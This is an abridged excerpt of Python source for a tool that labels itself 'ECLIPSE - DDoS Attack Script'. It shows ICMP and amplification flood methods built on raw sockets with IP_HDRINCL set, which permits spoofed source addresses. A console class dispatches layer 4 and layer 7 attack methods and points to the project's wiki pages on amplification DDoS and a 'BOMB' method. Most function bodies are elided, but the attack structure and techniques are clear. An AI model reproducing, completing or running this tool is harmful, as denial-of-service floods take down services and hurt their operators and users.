...
UDP()
    ...
    def ICMP(self) -> None:
        ...
        s = None
        with suppress(Exception), socket(AF_INET, RAW_SOCKET, IPPROTO_ICMP) as s:
    ...
    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, RAW_SOCKET,
                                         IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* ECLIPSE - DDoS Attack Script With %d Methods\n'
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Install bombardier: "
                        "https://github.com/EclipseDDoS/ECLIPSE/wiki/BOMB-method"
                    )
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    ...
                    logger.warning("https://github.com/EclipseDDoS/ECLIPSE/wiki/Amplification-ddos-attack")
